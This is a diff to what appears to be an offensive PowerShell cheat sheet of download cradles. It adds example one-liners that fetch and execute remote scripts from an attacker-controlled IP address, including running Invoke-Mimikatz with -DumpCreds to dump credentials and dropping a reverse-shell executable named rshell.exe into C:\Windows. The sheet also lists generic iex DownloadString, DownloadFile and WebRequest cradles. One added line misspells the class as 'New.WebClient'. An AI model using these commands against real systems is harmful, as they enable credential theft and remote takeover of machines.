@@ -72,16 +72,20 @@ Import-Module [module name/path]
 ##################
 #Net.Webclient DownloadString Method
 iex (New-Object Net.Webclient).DownloadString(http[colon]//attacker_url/script.ps1")
+##Example
+powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.10.10.5:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
 
 #Net.Webclient DownloadFile Method
 iex (New-Object System.Net.Webclient).DownloadFile("http[colon]//attacker_url/script.ps1","C:\programdata\payload.exe")
+##Example
+powershell -c iex (New-Object New.WebClient).DownloadFile('http://10.10.10.5:8000/rshell.exe', 'C:\Windows\payload.exe')
 
 #Net.WebClient OpenRead Method
 #.NET [Net.HttpWebRequest] class
 iex ([System.Net.WebRequest]::Create("http[colon]//attacker/script.ps1")).GetResponse()
 
 #XML Executable
-#XML file should contain below then execute XML file
+##XML file should contain below then execute XML file
 <?xml version="1.0"?>
 <command>
 	<a>
